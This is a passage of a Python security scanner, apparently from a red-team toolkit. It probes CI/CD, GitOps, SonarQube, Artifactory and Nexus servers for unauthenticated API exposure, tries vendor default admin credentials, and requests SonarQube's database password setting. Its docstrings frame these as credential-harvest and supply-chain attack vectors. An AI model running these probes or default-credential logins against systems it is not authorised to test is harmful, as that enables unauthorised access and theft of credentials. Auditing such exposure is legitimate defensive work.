            "/api/v4/users",
            "CRITICAL",
            "GITLAB_USERS_UNAUTH",
            "GITLAB_USERS_UNAUTH — GitLab user enumeration without authentication",
            lambda body: body.strip().startswith(b"[") and b'"username"' in body,
        ),
        (
            "/-/admin/users",
            "CRITICAL",
            "GITLAB_ADMIN_PANEL_UNAUTH",
            "GITLAB_ADMIN_PANEL_UNAUTH — GitLab admin interface accessible without authentication",
            lambda body: b"Admin Area" in body or b"admin" in body.lower(),
        ),
        (
            "/api/v4/runners",
            "HIGH",
            "GITLAB_RUNNERS_UNAUTH",
            "GITLAB_RUNNERS_UNAUTH — GitLab CI runner registration tokens potentially exposed",
            lambda body: body.strip().startswith(b"[") and (b'"token"' in body or b'"id"' in body),
        ),
    ]

    for path, severity, title, detail, validator in checks:
        url = f"http://{host}:{port}{path}"
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        try:
            with urllib.request.urlopen(req, timeout=timeout) as r:
                if r.status == 200:
                    body = r.read()
                    if body and validator(body):
                        findings.append({
                            "severity": severity,
                            "title": title,
                            "detail": detail,
                            "host": host,
                            "port": port,
                        })
        except Exception:
            pass

    return findings


def probe_tekton_pipeline_exposure(host: str, port: int = 80, timeout: float = 10.0) -> list:
    """Probe Tekton CI/CD for unauthenticated pipeline and task run exposure."""
    findings = []

    checks = [
        (
            "/apis/tekton.dev/v1beta1/namespaces/default/pipelineruns",
            "CRITICAL",
            "TEKTON_PIPELINERUNS_UNAUTH",
            "TEKTON_PIPELINERUNS_UNAUTH — Tekton pipeline execution history accessible without authentication",
            lambda body: b'"items"' in body or b'"pipelineRunName"' in body or b'"pipelineRef"' in body,
        ),
        (
            "/apis/tekton.dev/v1beta1/namespaces/default/taskruns",
            "HIGH",
            "TEKTON_TASKRUNS_UNAUTH",
            "TEKTON_TASKRUNS_UNAUTH — Tekton task run list accessible",
            lambda body: b'"items"' in body or b'"taskRef"' in body or b'"taskRunName"' in body,
        ),
        (
            "/apis/tekton.dev/v1beta1/namespaces/default/pipelines",
            "CRITICAL",
            "TEKTON_PIPELINES_UNAUTH",
            "TEKTON_PIPELINES_UNAUTH — Tekton pipeline definitions exposed (source pipeline steps, secrets refs)",
            lambda body: b'"items"' in body or b'"tasks"' in body or b'"pipelineSpec"' in body,
        ),
    ]

    for path, severity, title, detail, validator in checks:
        url = f"http://{host}:{port}{path}"
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        try:
            with urllib.request.urlopen(req, timeout=timeout) as r:
                if r.status == 200:
                    body = r.read()
                    if body and validator(body):
                        findings.append({
                            "severity": severity,
                            "title": title,
                            "detail": detail,
                            "host": host,
                            "port": port,
                        })
        except Exception:
            pass

    return findings


def probe_argocd_api(host: str, port: int = 443, timeout: float = 10.0) -> list:
    """Probe ArgoCD for unauthenticated API exposure including apps, repos, clusters, and settings."""
    findings = []

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    checks = [
        (
            "/api/v1/applications",
            "CRITICAL",
            "ARGOCD_APPS_UNAUTH",
            "ARGOCD_APPS_UNAUTH — ArgoCD application list accessible (Git repos and deployment targets)",
            lambda body: b'"items"' in body or b'"metadata"' in body or b'"spec"' in body,
        ),
        (
            "/api/v1/repositories",
            "CRITICAL",
            "ARGOCD_REPOS_UNAUTH",
            "ARGOCD_REPOS_UNAUTH — ArgoCD Git repository list accessible (source repo URLs and credentials)",
            lambda body: b'"items"' in body or b'"repo"' in body or b'"connectionState"' in body,
        ),
        (
            "/api/v1/clusters",
            "CRITICAL",
            "ARGOCD_CLUSTERS_UNAUTH",
            "ARGOCD_CLUSTERS_UNAUTH — ArgoCD managed cluster list exposed (includes kubeconfig/tokens)",
            lambda body: b'"items"' in body or b'"server"' in body or b'"config"' in body,
        ),
        (
            "/api/v1/settings",
            "HIGH",
            "ARGOCD_SETTINGS_UNAUTH",
            "ARGOCD_SETTINGS_UNAUTH — ArgoCD configuration settings accessible",
            lambda body: b'"appLabelKey"' in body or b'"resourceOverrides"' in body or b'"statusBadgeEnabled"' in body,
        ),
    ]

    for path, severity, title, detail, validator in checks:
        url = f"https://{host}:{port}{path}"
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        try:
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
                if r.status == 200:
                    body = r.read()
                    if body and validator(body):
                        findings.append({
                            "severity": severity,
                            "title": title,
                            "detail": detail,
                            "host": host,
                            "port": port,
                        })
        except Exception:
            pass

    return findings


def probe_flux_gitops_exposure(host: str, port: int = 80, timeout: float = 10.0) -> list:
    """Probe Flux GitOps API endpoints for unauthenticated exposure."""
    findings = []

    checks = [
        (
            "/apis/source.toolkit.fluxcd.io/v1beta2/gitrepositories",
            "CRITICAL",
            "FLUX_GIT_REPOS_UNAUTH",
            "FLUX_GIT_REPOS_UNAUTH — Flux GitOps repository configurations accessible (Git credentials, SSH keys)",
        ),
        (
            "/apis/kustomize.toolkit.fluxcd.io/v1beta2/kustomizations",
            "CRITICAL",
            "FLUX_KUSTOMIZATIONS_UNAUTH",
            "FLUX_KUSTOMIZATIONS_UNAUTH — Flux Kustomization sync targets exposed",
        ),
        (
            "/apis/helm.toolkit.fluxcd.io/v2beta1/helmreleases",
            "HIGH",
            "FLUX_HELM_RELEASES_UNAUTH",
            "FLUX_HELM_RELEASES_UNAUTH — Flux HelmRelease configurations accessible",
        ),
    ]

    for path, severity, title, detail in checks:
        url = f"http://{host}:{port}{path}"
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        try:
            with urllib.request.urlopen(req, timeout=timeout) as r:
                if r.status == 200:
                    body = r.read()
                    if body and (b'"items"' in body or b'"metadata"' in body or b'"kind"' in body):
                        findings.append({
                            "severity": severity,
                            "title": title,
                            "detail": detail,
                            "host": host,
                            "port": port,
                        })
        except Exception:
            pass

    return findings


def probe_crossplane_exposure(host: str, port: int = 80, timeout: float = 10.0) -> list:
    """Probe Crossplane infrastructure provider endpoints for unauthenticated exposure."""
    findings = []

    checks = [
        (
            "/apis/pkg.crossplane.io/v1/providers",
            "HIGH",
            "CROSSPLANE_PROVIDERS_UNAUTH",
            "CROSSPLANE_PROVIDERS_UNAUTH — Crossplane infrastructure providers enumerable",
        ),
        (
            "/apis/pkg.crossplane.io/v1/configurations",
            "HIGH",
            "CROSSPLANE_CONFIGS_UNAUTH",
            "CROSSPLANE_CONFIGS_UNAUTH — Crossplane package configurations accessible",
        ),
        (
            "/apis/crossplane.io/v1alpha1/environmentconfigs",
            "CRITICAL",
            "CROSSPLANE_ENV_CONFIGS_UNAUTH",
            "CROSSPLANE_ENV_CONFIGS_UNAUTH — Crossplane environment configurations exposed (cloud provider credentials references)",
        ),
    ]

    for path, severity, title, detail in checks:
        url = f"http://{host}:{port}{path}"
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        try:
            with urllib.request.urlopen(req, timeout=timeout) as r:
                if r.status == 200:
                    body = r.read()
                    if body and (b'"items"' in body or b'"metadata"' in body or b'"kind"' in body):
                        findings.append({
                            "severity": severity,
                            "title": title,
                            "detail": detail,
                            "host": host,
                            "port": port,
                        })
        except Exception:
            pass

    return findings


def probe_sonarqube_exposure(host: str, port: int = 9000, timeout: float = 10.0) -> list:
    """Probe SonarQube code analysis instances for unauthenticated access and default credentials.

    Red team relevance (Tribe of Hackers RT — Campbell, Gates, Perez):
    SonarQube holds entire source-code repositories with embedded secrets, tokens,
    and connection strings that the scan surfaces. Unauthenticated access turns a
    code-quality server into a full-codebase exfil and credential-harvest vector.
    Default admin:admin credentials persist across enterprise deployments because
    SonarQube ships them and many DevOps pipelines never rotate them.
    """
    findings = []
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    def _sq_get(path: str, extra_headers: Optional[dict] = None) -> Optional[bytes]:
        for scheme in ("http", "https"):
            url = f"{scheme}://{host}:{port}{path}"
            h = {"User-Agent": "Mozilla/5.0"}
            if extra_headers:
                h.update(extra_headers)
            req = urllib.request.Request(url, headers=h)
            try:
                with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
                    if r.status == 200:
                        return r.read()
            except Exception:
                pass
        return None

    # /api/system/status -> {"status":"UP"} -> HIGH
    body = _sq_get("/api/system/status")
    if body and b'"status"' in body and b'"UP"' in body:
        findings.append({
            "severity": "HIGH",
            "title": "SONARQUBE_API_EXPOSED",
            "detail": "SONARQUBE_API_EXPOSED — SonarQube /api/system/status returns UP; instance reachable unauthenticated",
            "host": host,
            "port": port,
        })

    # /api/system/info -> full system info dump -> CRITICAL
    body = _sq_get("/api/system/info")
    if body and (b'"System"' in body or b'"Database"' in body or b'sonar.' in body):
        findings.append({
            "severity": "CRITICAL",
            "title": "SONARQUBE_SYSTEM_INFO_UNAUTH",
            "detail": "SONARQUBE_SYSTEM_INFO_UNAUTH — SonarQube /api/system/info returns system configuration without authentication (DB host, version, paths)",
            "host": host,
            "port": port,
        })

    # /api/projects/search -> project list (source code repos) -> CRITICAL
    body = _sq_get("/api/projects/search")
    if body and (b'"components"' in body or b'"paging"' in body):
        findings.append({
            "severity": "CRITICAL",
            "title": "SONARQUBE_PROJECTS_UNAUTH",
            "detail": "SONARQUBE_PROJECTS_UNAUTH — SonarQube /api/projects/search exposes project/repository list unauthenticated; source-code inventory leaked",
            "host": host,
            "port": port,
        })

    # /api/settings/values -> global configuration including DB credentials -> CRITICAL
    body = _sq_get("/api/settings/values")
    if body and b'"settings"' in body:
        findings.append({
            "severity": "CRITICAL",
            "title": "SONARQUBE_SETTINGS_UNAUTH",
            "detail": "SONARQUBE_SETTINGS_UNAUTH — SonarQube /api/settings/values returns global configuration without authentication; may include JDBC/LDAP credentials",
            "host": host,
            "port": port,
        })

    # /api/settings/values?keys=sonar.jdbc.password -> DB password direct disclosure -> CRITICAL
    body = _sq_get("/api/settings/values?keys=sonar.jdbc.password")
    if body and b"sonar.jdbc.password" in body:
        findings.append({
            "severity": "CRITICAL",
            "title": "SONARQUBE_DB_PASSWORD_DISCLOSED",
            "detail": "SONARQUBE_DB_PASSWORD_DISCLOSED — SonarQube /api/settings/values?keys=sonar.jdbc.password responded with sonar.jdbc.password key; database credential disclosure",
            "host": host,
            "port": port,
        })

    # /api/users/search -> user enumeration -> HIGH
    body = _sq_get("/api/users/search")
    if body and (b'"users"' in body or b'"login"' in body):
        findings.append({
            "severity": "HIGH",
            "title": "SONARQUBE_USERS_UNAUTH",
            "detail": "SONARQUBE_USERS_UNAUTH — SonarQube /api/users/search exposes user list unauthenticated; login names and email addresses leaked",
            "host": host,
            "port": port,
        })

    # Default credentials: admin:admin via Basic auth -> CRITICAL
    creds_b64 = base64.b64encode(b"admin:admin").decode()
    body = _sq_get("/api/system/info", extra_headers={"Authorization": f"Basic {creds_b64}"})
    if body and (b'"System"' in body or b'"Database"' in body or b'sonar.' in body):
        findings.append({
            "severity": "CRITICAL",
            "title": "SONARQUBE_DEFAULT_ADMIN_CREDS",
            "detail": "SONARQUBE_DEFAULT_ADMIN_CREDS — SonarQube admin:admin default credentials accepted; full administrative access",
            "host": host,
            "port": port,
        })

    return findings


def probe_artifactory_nexus_registry(host: str, port: int = 8081, timeout: float = 10.0) -> list:
    """Probe JFrog Artifactory and Sonatype Nexus artifact registries for unauthenticated access.

    Red team relevance (Tribe of Hackers RT — MalcomVetter, McCrillis, Gates):
    Artifact registries are the distribution layer of the software supply chain.
    Unauthenticated access enables dependency-confusion attacks (PyPI/npm proxy),
    artifact poisoning, and credential harvest from repository configurations.
    Default credentials (admin:password for Artifactory, admin:admin123 for Nexus)
    ship with installers and are frequently left unchanged in DevOps environments.
    Compromising an artifact registry gives write access to every build that pulls
    from it — the highest-leverage supply-chain pivot point on an internal network.
    """
    findings = []
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    def _reg_get(path: str, check_port: int, extra_headers: Optional[dict] = None) -> Optional[bytes]:
        for scheme in ("http", "https"):
            url = f"{scheme}://{host}:{check_port}{path}"
            h = {"User-Agent": "Mozilla/5.0"}
            if extra_headers:
                h.update(extra_headers)
            req = urllib.request.Request(url, headers=h)
            try:
                with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
                    if r.status == 200:
                        return r.read()
            except Exception:
                pass
        return None

    # --- JFrog Artifactory probes (ports 8081 and 8082) ---
    for art_port in (port, 8082):
        # /artifactory/api/system/ping -> HIGH
        body = _reg_get("/artifactory/api/system/ping", check_port=art_port)
        if body and b"OK" in body:
            findings.append({
                "severity": "HIGH",
                "title": "ARTIFACTORY_PING_UNAUTH",
                "detail": "ARTIFACTORY_PING_UNAUTH — JFrog Artifactory /artifactory/api/system/ping responds without authentication; instance confirmed reachable",
                "host": host,
                "port": art_port,
            })

        # /artifactory/api/repositories -> full repo list -> CRITICAL
        body = _reg_get("/artifactory/api/repositories", check_port=art_port)
        if body and b'"key"' in body and b'"type"' in body:
            findings.append({
                "severity": "CRITICAL",
                "title": "ARTIFACTORY_REPOS_UNAUTH",
                "detail": "ARTIFACTORY_REPOS_UNAUTH — JFrog Artifactory /artifactory/api/repositories exposes full repository list unauthenticated; supply-chain attack surface mapped",
                "host": host,
                "port": art_port,
            })

        # /artifactory/api/security/users -> user list -> HIGH
        body = _reg_get("/artifactory/api/security/users", check_port=art_port)
        if body and b'"name"' in body and b'"realm"' in body:
            findings.append({
                "severity": "HIGH",
                "title": "ARTIFACTORY_USERS_UNAUTH",
                "detail": "ARTIFACTORY_USERS_UNAUTH — JFrog Artifactory /artifactory/api/security/users exposes user list unauthenticated",
                "host": host,
                "port": art_port,
            })

        # /artifactory/api/security/permissions -> ACL -> CRITICAL
        body = _reg_get("/artifactory/api/security/permissions", check_port=art_port)
        if body and b'"name"' in body:
            findings.append({
                "severity": "CRITICAL",
                "title": "ARTIFACTORY_PERMISSIONS_UNAUTH",
                "detail": "ARTIFACTORY_PERMISSIONS_UNAUTH — JFrog Artifactory /artifactory/api/security/permissions exposes ACL unauthenticated; repository access controls disclosed",
                "host": host,
                "port": art_port,
            })

        # Default credentials admin:password -> CRITICAL
        art_creds_b64 = base64.b64encode(b"admin:password").decode()
        body = _reg_get("/artifactory/api/system/ping", check_port=art_port,
                        extra_headers={"Authorization": f"Basic {art_creds_b64}"})
        if body and b"OK" in body:
            findings.append({
                "severity": "CRITICAL",
                "title": "ARTIFACTORY_DEFAULT_CREDS",
                "detail": "ARTIFACTORY_DEFAULT_CREDS — JFrog Artifactory admin:password default credentials accepted; full administrative access to artifact registry",
                "host": host,
                "port": art_port,
            })

    # --- Sonatype Nexus Repository probes (ports 8081 and 8083) ---
    for nexus_port in (port, 8083):
        # /service/rest/v1/status -> HIGH
        body = _reg_get("/service/rest/v1/status", check_port=nexus_port)
        if body and (b'"edition"' in body or b'"version"' in body or b'"state"' in body):
            findings.append({
                "severity": "HIGH",
                "title": "NEXUS_REPO_STATUS_UNAUTH",
                "detail": "NEXUS_REPO_STATUS_UNAUTH — Sonatype Nexus /service/rest/v1/status responds without authentication; version and edition disclosed",
                "host": host,
                "port": nexus_port,
            })

        # /service/rest/v1/repositories -> full repo list -> CRITICAL
        body = _reg_get("/service/rest/v1/repositories", check_port=nexus_port)
        if body and (b'"name"' in body and b'"format"' in body):
            findings.append({
                "severity": "CRITICAL",
                "title": "NEXUS_REPOS_UNAUTH",
                "detail": "NEXUS_REPOS_UNAUTH — Sonatype Nexus /service/rest/v1/repositories exposes repository list unauthenticated; artifact supply chain surface mapped",
                "host": host,
                "port": nexus_port,
            })

        # /service/rest/v1/security/users -> user list -> HIGH
        body = _reg_get("/service/rest/v1/security/users", check_port=nexus_port)
        if body and (b'"userId"' in body or b'"emailAddress"' in body):
            findings.append({
                "severity": "HIGH",
                "title": "NEXUS_USERS_UNAUTH",
                "detail": "NEXUS_USERS_UNAUTH — Sonatype Nexus /service/rest/v1/security/users exposes user accounts unauthenticated",
                "host": host,
                "port": nexus_port,
            })

        # Default credentials: admin:admin123 and admin:password -> CRITICAL
        for cred_pair in (b"admin:admin123", b"admin:password"):
            creds_b64 = base64.b64encode(cred_pair).decode()
            body = _reg_get("/service/rest/v1/status", check_port=nexus_port,
                            extra_headers={"Authorization": f"Basic {creds_b64}"})
            if body and (b'"edition"' in body or b'"version"' in body or b'"state"' in body):
                cred_str = cred_pair.decode()
                findings.append({
                    "severity": "CRITICAL",
                    "title": "NEXUS_DEFAULT_CREDS",
                    "detail": f"NEXUS_DEFAULT_CREDS — Sonatype Nexus default credentials accepted ({cred_str}); full administrative access to artifact registry",
                    "host": host,
                    "port": nexus_port,
                })
                break

        # PyPI proxy: /repository/pypi/simple/ -> dependency confusion surface -> HIGH
        body = _reg_get("/repository/pypi/simple/", check_port=nexus_port)
        if body and (b"Simple" in body or b"<a href" in body):
            findings.append({
                "severity": "HIGH",
                "title": "NEXUS_PYPI_PROXY_UNAUTH",
                "detail": "NEXUS_PYPI_PROXY_UNAUTH — Sonatype Nexus PyPI proxy /repository/pypi/simple/ accessible unauthenticated; dependency confusion attack surface exposed",
                "host": host,
                "port": nexus_port,
            })

    return findings
